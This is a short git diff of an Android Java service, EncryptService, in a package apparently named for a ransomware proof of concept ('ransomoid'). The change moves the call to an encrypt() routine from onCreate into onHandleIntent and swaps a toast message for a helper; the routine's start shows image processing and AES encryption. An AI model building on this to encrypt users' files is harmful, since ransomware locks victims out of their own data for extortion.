@@ -3,7 +3,9 @@ package falezza.fabio.ransomoid.services;
 import android.app.Service;
 import android.content.Intent;
 import android.os.Environment;
+import android.os.Handler;
 import android.os.IBinder;
+import android.support.annotation.Nullable;
 import android.util.Base64;
 import android.widget.Toast;
 
@@ -19,17 +21,25 @@ import falezza.fabio.ransomoid.utils.ImageProcessor;
 
 public class EncryptService extends ParentService {
 
-
+    public EncryptService() {
+        super("EncryptService");
+    }
 
     @Override
     public void onCreate() {
         super.onCreate();
+        //this.encrypt();
+    }
 
+    @Override
+    protected void onHandleIntent(@Nullable Intent intent) {
+        super.onHandleIntent(intent);
         this.encrypt();
     }
 
     private void encrypt() {
-        Toast.makeText(this, "Encrypting...", Toast.LENGTH_LONG).show();
+        this.showMessage("Encrypting...");
+
         try {
             ImageProcessor imgProcessor = ImageProcessor.getInstance(this);
             AesEncrypter aesEncrypter = AesEncrypter.getInstance();
